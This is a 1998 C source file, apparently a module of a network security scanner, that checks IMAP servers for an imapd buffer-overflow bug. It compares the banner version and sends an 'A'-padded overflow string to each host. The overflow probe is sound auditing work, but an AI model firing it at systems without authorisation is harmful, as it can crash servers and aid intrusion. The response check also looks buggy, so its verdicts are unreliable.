/*

imapd.c

Author: Liraz Siri <liraz@bigfoot.com>

Copyright (c) 1998 Liraz Siri <liraz@bigfoot.com>, Ariel, Israel
                   All rights reserved

Created: Sat Sep 12 08:50:48 GMT 1998
Updated: Sat Sep 26 08:48:24 GMT 1998. Now we actually try to bufferoverflow
				       the server.

Code for the hook to test for the latest imapd 4 vulnerability, 
by version, and more recently by bufferoverflow`ability (response, or
actually none response to a bufferoverflow).

*/

#include "BASS.h"
#include "imapd.h"
#include "network.h"
#include "log.h"

/* imapd hook */
int imapd_handlehost(struct sockaddr_in *addr, char *host, int timer)
{
 int tcpfd, n, i;
 int vulnerable_version, imap_overflow;
 struct sockaddr_in raddr;

 char *version_proto, *version;
 char *serverid, *buff, *crap;
 char *imap_flavour, *imap_overflow_template, *imap_immune_version; 

 const char delim[] = " \t";
 char *sepregister, *token;

 memcpy(&raddr, addr, sizeof(struct sockaddr_in));
 raddr.sin_port = htons(IMAPPORT);

 if((tcpfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) return -1;
 if((tconnect(tcpfd, (struct sockaddr *)&raddr, sizeof(struct sockaddr),
               timer)) < 0) return -1;

 serverid = (char *) alloca(MBUFSIZ);

 if((n = network_gets(tcpfd, serverid, MBUFSIZ, timer)) < MMINHDRLEN)
   return -1;

 sepregister = serverid;

 if(!(token = strsep(&sepregister, delim)) || strcmp(token, "*") != 0 ||
    !(token = strsep(&sepregister, delim)) || strcasecmp(token, "OK") != 0 ||
    !(token = strsep(&sepregister, delim)) || 
    !(imap_flavour = strsep(&sepregister, delim)) ||
      strncasecmp(imap_flavour, S_IMAP, strlen(S_IMAP)) != 0 ||
    !(version = strsep(&sepregister, delim)))
 { close(tcpfd); errno = EPROTO; return -1; }

 if(!strcmp(imap_flavour, S_IMAP_2BIS))
 { 
   version = strsep(&sepregister, delim);
   imap_overflow_template = IMAP_2BIS_OVERFLOW_TEMPLATE;
   imap_immune_version = IMAP_2BIS_IMMUNE_VERSION;
 }
 else if(!strcmp(imap_flavour, S_IMAP_REV1))
 {
   imap_overflow_template = IMAP_REV1_OVERFLOW_TEMPLATE;
   imap_immune_version = IMAP_REV1_IMMUNE_VERSION;
 }
 else
 {
   close(tcpfd);
   errno = EPROTO;
   return -1;
 }
	  
 crap = (char *) alloca(IMAP_OVERFLOW_LEN + 1);
 buff = (char *) alloca(IMAP_OVERFLOW_LEN + strlen(imap_overflow_template) + 1);
 memset(crap, 'A', IMAP_OVERFLOW_LEN);
 crap[IMAP_OVERFLOW_LEN] = '\0';

 snprintf(buff, IMAP_OVERFLOW_LEN + strlen(imap_overflow_template),
		imap_overflow_template, strlen(crap), crap);

 network_twrite(tcpfd, buff, strlen(buff), timer);
 buff[0] = '\0';
 network_gets(tcpfd, buff, strlen(buff) - 1, timer);
 close(tcpfd);

 imap_overflow = !strlen(buff);

 i = 0;
 if(version[0] == 'v') i = 1;
 vulnerable_version = (strlen(&version[i]) && 
		       atof(&version[i]) < atof(imap_immune_version));
 
 /* pathetic little hack */
 version_proto = (char *)alloca(strlen(version) + strlen(imap_flavour) + 8);
 sprintf(version_proto, "%s %s", imap_flavour, &version[i]);

 if(imap_overflow && vulnerable_version) 
  log("wu_imapd - [%s] vulnerable (bufferoverflowed) version (%s).",
	    network_getname(host), version_proto);
 else
   if(vulnerable_version)
     log("wu_imapd - [%s] SHOULD be vulnerable. no overflow (%s).",
	 network_getname(host), version_proto);
   else
     if(imap_overflow)
       log("wu_imapd - [%s] SHOULD NOT be vulnerable, (bufferoverflowed) (%s)."
	   ,network_getname(host), version_proto);
     else
       log("wu_imapd - [%s] definately immune server. version (%s).",
	   host, version_proto);

 return 0;
}
